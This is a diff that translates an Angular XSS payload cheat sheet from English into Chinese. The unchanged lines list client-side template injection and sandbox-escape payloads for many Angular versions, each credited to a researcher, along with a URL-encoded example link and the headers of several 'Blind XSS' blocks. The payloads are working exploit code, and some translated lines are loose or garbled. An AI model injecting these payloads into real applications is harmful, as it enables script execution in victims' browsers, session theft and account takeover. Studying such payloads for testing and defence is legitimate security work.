@@ -1,26 +1,26 @@
 # XSS in Angular
 
-The following payloads are based on Client Side Template Injection.
+接下来的有效载荷是在客户端模板的基础上注入。
 
 ## Stored/Reflected XSS - Simple alert 
 
-> Angular as of version 1.6 have removed the sandbox altogether
+> Angular从1.6版开始，就已经删除了沙盒
 
-Angular 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
+Angular 1.6+ 由[Mario Heiderich](https://twitter.com/cure53berlin)提供
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
-Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
+Angular 1.6+ 由 [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)提供
 
 ```javascript
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
 ```
 
-Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
+在 [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)中可以得到有用的例子
 
-Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
+Angular 1.6.0 由 [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)提供
 
 ```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -28,7 +28,7 @@ Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/105588761
 {{$on.constructor('alert(1)')()}}
 ```
 
-Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
+Angular 1.5.9 - 1.5.11 由 [Jan Horn](https://twitter.com/tehjh)提供
 
 ```javascript
 {{
@@ -150,7 +150,7 @@ Angular 1.0.1 - 1.1.5 and Vue JS
 
 ## Blind XSS
 
-1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
+1.0.1 - 1.1.5 && > 1.6.0 由Mario Heiderich (Cure53)提供
 
 ```javascript
 {{
@@ -161,7 +161,7 @@ Angular 1.0.1 - 1.1.5 and Vue JS
 ```
 
 
-Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
+Shorter 1.0.1 - 1.1.5 && > 1.6.0 由 Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)提供
 
 ```javascript
 {{
@@ -171,7 +171,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)
+1.2.0 - 1.2.5 由 Gareth Heyes (PortSwigger)提供
 
 ```javascript
 {{
@@ -182,7 +182,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)
+1.2.6 - 1.2.18 由 Jan Horn (Cure53, now works at Google Project Zero)提供
 
 ```javascript
 {{
@@ -193,7 +193,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.2.19 (FireFox) by Mathias Karlsson
+1.2.19 (FireFox) 由 Mathias Karlsson 提供
 
 ```javascript
 {{
@@ -204,7 +204,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)
+1.2.20 - 1.2.29 由 Gareth Heyes (PortSwigger) 提供
 
 ```javascript
 {{
@@ -216,7 +216,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)
+1.3.0 - 1.3.9 由 Gareth Heyes (PortSwigger) 提供
 
 ```javascript
 {{
@@ -228,7 +228,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)
+1.4.0 - 1.5.8 由 Gareth Heyes (PortSwigger)提供
 
 ```javascript
 {{
@@ -238,7 +238,7 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
-1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)
+1.5.9 - 1.5.11 由 Jan Horn (Cure53, now works at Google Project Zero)提供
 
 ```javascript
 {{
